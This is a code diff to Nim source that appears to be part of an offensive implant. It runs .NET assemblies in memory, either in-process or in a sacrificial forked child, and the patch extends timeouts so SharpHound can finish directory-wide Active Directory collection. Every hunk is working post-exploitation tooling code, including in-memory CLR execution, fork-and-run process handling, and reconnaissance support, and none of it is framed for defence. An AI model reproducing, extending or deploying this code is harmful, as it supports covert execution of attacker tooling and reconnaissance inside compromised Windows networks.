@@ -288,7 +288,9 @@ proc execDotNet*(asmBytes: openArray[byte], args: string,
   if not childMode: installExitHook()
   let ht = CreateThread(nil, 0, invokeThread, addr work, 0, nil)
   if ht != 0:
-    discard WaitForSingleObject(ht, DWORD(60_000))
+    # The parent process owns the bounded timeout; allow the CLR invocation
+    # thread to run long enough for directory-wide SharpHound collection.
+    discard WaitForSingleObject(ht, DWORD(900_000))
     discard CloseHandle(ht)
   if not childMode: removeExitHook()
 
@@ -332,7 +334,7 @@ proc forkWriteThread(param: pointer): DWORD {.stdcall.} =
   discard CloseHandle(w.h)
   return 0
 
-proc forkRunAssembly*(asmBytes: openArray[byte], args: string): string =
+proc forkRunAssembly*(asmBytes: openArray[byte], args: string, timeoutSec: int = 0): string =
   ## Spawns a sacrificial child copy of the current exe to host the CLR.
   ## If the assembly calls Environment.Exit() only the child dies.
   var exeBuf: array[MAX_PATH + 1, WCHAR]
@@ -377,10 +379,12 @@ proc forkRunAssembly*(asmBytes: openArray[byte], args: string): string =
   let wt = CreateThread(nil, 0, forkWriteThread, addr work, 0, nil)
   if wt != 0: discard CloseHandle(wt)
 
-  # Read output until pipe closed (child exited) — 60s timeout
+  # Read output until pipe closed (child exited). SharpHound can opt into a
+  # bounded longer window; all other assemblies keep the 60s default.
   var output: string
   var buf: array[8192, byte]
-  let deadline = GetTickCount() + DWORD(60_000)
+  let timeoutMs = if timeoutSec >= 60 and timeoutSec <= 1800: timeoutSec * 1000 else: 60_000
+  let deadline = GetTickCount() + DWORD(timeoutMs)
   while GetTickCount() < deadline:
     var avail: DWORD = 0
     if PeekNamedPipe(outRd, nil, 0, nil, addr avail, nil) == 0: break
@@ -408,7 +412,7 @@ proc forkRunAssembly*(asmBytes: openArray[byte], args: string): string =
 
   if GetTickCount() >= deadline:
     discard TerminateProcess(pi.hProcess, 1)
-    if output.len == 0: output = "[!] fork-and-run timeout (60s)"
+    output.add("\n[!] fork-and-run timeout (" & $int(timeoutMs div 1000) & "s)")
 
   discard WaitForSingleObject(pi.hProcess, 5000)
   discard CloseHandle(pi.hProcess)
